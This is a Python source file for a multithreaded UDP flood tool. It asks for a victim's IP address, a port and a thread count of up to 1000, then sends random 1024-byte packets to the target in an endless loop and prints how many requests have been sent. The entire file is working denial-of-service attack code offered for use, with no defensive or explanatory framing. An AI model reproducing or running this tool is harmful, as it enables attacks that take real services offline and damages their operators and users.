import socket
from threading import Thread
import random
from core import ccolors


def dos(vhost, vport):
    global requests
    try:
        while True:
            s.sendto(packet, (vhost, vport))
            requests = str(int(requests) + 1)
            print(ccolors.blue + "Flooding..." + requests + " requests sent" + ccolors.end)
    except:
        print(ccolors.warn + "<!>" + str(vhost) + " is not responding" + ccolors.end)


def start():
    global requests, packet, s
    requests = "0"
    packet = random._urandom(1024)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    thr = []
    host = str(input(ccolors.red + "[Victims IP]> " + ccolors.end))
    try:
        port = int(input(ccolors.red + "[Victims Port]> " + ccolors.end))
    except:
        print(ccolors.warn + "<!> Port must be specified as Integer" + ccolors.end)
        return None
    try:
        threads = int(input(ccolors.red + "[Number of threads]> " + ccolors.end))
        if threads > 1000:
            print(ccolors.warn + "<!> Number of threads cant be more than 1000" + ccolors.end)
            return None
    except:
        print(ccolors.warn + "<!> Number of threads must be specified as Integer" + ccolors.end)
        return None

    for x in range(threads):
        t = Thread(target=dos, args=(host, port))
        thr.append(t)
    for x in range(threads):
        thr[x].start()
